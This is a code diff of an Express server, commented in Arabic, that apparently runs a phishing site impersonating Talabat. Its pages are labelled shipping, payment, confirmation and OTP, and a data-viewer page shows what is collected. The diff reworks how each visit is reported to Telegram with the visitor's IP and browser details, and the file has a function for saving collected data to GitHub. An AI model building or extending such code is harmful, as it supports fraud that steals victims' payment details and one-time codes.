@@ -44,7 +44,7 @@ async function sendTelegramMessage(message) {
 // ========== دالة إرسال إشعار الزيارة ==========
 async function sendVisitNotification(page, ip, userAgent) {
     try {
-        let msg = `👁️ <b>زيارة جديدة للموقع</b>\n`;
+        let msg = `👁️ <b>زيارة جديدة للموقع - Talabat</b>\n`;
         msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
         msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
         msg += `📄 الصفحة: ${page}\n`;
@@ -58,49 +58,6 @@ async function sendVisitNotification(page, ip, userAgent) {
         console.error('❌ خطأ في إرسال إشعار الزيارة:', e.message);
     }
 }
-
-// ========== Middleware لتتبع الزيارات ==========
-app.use((req, res, next) => {
-    // تجاهل طلبات API والملفات الثابتة
-    if (req.path.startsWith('/api/') || 
-        req.path.startsWith('/submit-') || 
-        req.path === '/favicon.ico' ||
-        req.path.match(/\.(css|js|png|jpg|jpeg|gif|ico|svg|webp|woff|woff2|ttf|eot)$/)) {
-        return next();
-    }
-    
-    // منع التكرار: استخدم Session أو Cookie بسيط
-    // نستخدم متغير عشان نتأكد إن الإشعار اتسبت قبل كده
-    if (req._visitNotified) {
-        return next();
-    }
-    req._visitNotified = true;
-    
-    // الحصول على IP العميل
-    const ip = req.headers['x-forwarded-for']?.split(',')[0] || 
-               req.headers['x-real-ip'] || 
-               req.socket.remoteAddress || 
-               'غير معروف';
-    
-    // الحصول على نوع المتصفح
-    const userAgent = req.headers['user-agent'] || 'غير معروف';
-    
-    // اسم الصفحة
-    let pageName = req.path || '/';
-    if (pageName === '/') pageName = 'الصفحة الرئيسية 🏠';
-    else if (pageName === '/page2') pageName = 'صفحة الشحن 📦';
-    else if (pageName === '/page3') pageName = 'صفحة الدفع 💳';
-    else if (pageName === '/page4') pageName = 'صفحة التأكيد 🔐';
-    else if (pageName === '/page5') pageName = 'صفحة OTP 📱';
-    else if (pageName === '/data-viewer') pageName = 'عرض البيانات 📊';
-    
-    // إرسال إشعار (مع تأخير صغير)
-    setTimeout(() => {
-        sendVisitNotification(pageName, ip, userAgent);
-    }, 200);
-    
-    next();
-});
 
 // ========== دالة حفظ على GitHub ==========
 async function saveToGitHub(newData) {
@@ -169,14 +126,47 @@ let cachedData = '';
 let lastFetchTime = 0;
 
 // ========== المسارات ==========
-app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'views', 'page1.html')));
-app.get('/page2', (req, res) => res.sendFile(path.join(__dirname, 'views', 'page2.html')));
-app.get('/page3', (req, res) => res.sendFile(path.join(__dirname, 'views', 'page3.html')));
-app.get('/page4', (req, res) => res.sendFile(path.join(__dirname, 'views', 'page4.html')));
-app.get('/page5', (req, res) => res.sendFile(path.join(__dirname, 'views', 'page5.html')));
+app.get('/', (req, res) => {
+    // إرسال إشعار الزيارة
+    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'غير معروف';
+    const userAgent = req.headers['user-agent'] || 'غير معروف';
+    sendVisitNotification('الصفحة الرئيسية 🏠', ip, userAgent);
+    res.sendFile(path.join(__dirname, 'views', 'page1.html'));
+});
+
+app.get('/page2', (req, res) => {
+    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'غير معروف';
+    const userAgent = req.headers['user-agent'] || 'غير معروف';
+    sendVisitNotification('صفحة الشحن 📦', ip, userAgent);
+    res.sendFile(path.join(__dirname, 'views', 'page2.html'));
+});
+
+app.get('/page3', (req, res) => {
+    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'غير معروف';
+    const userAgent = req.headers['user-agent'] || 'غير معروف';
+    sendVisitNotification('صفحة الدفع 💳', ip, userAgent);
+    res.sendFile(path.join(__dirname, 'views', 'page3.html'));
+});
+
+app.get('/page4', (req, res) => {
+    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'غير معروف';
+    const userAgent = req.headers['user-agent'] || 'غير معروف';
+    sendVisitNotification('صفحة التأكيد 🔐', ip, userAgent);
+    res.sendFile(path.join(__dirname, 'views', 'page4.html'));
+});
+
+app.get('/page5', (req, res) => {
+    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'غير معروف';
+    const userAgent = req.headers['user-agent'] || 'غير معروف';
+    sendVisitNotification('صفحة OTP 📱', ip, userAgent);
+    res.sendFile(path.join(__dirname, 'views', 'page5.html'));
+});
 
 // ========== صفحة عرض البيانات ==========
 app.get('/data-viewer', (req, res) => {
+    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'غير معروف';
+    const userAgent = req.headers['user-agent'] || 'غير معروف';
+    sendVisitNotification('عرض البيانات 📊', ip, userAgent);
     res.sendFile(path.join(__dirname, 'views', 'data-viewer.html'));
 });
 
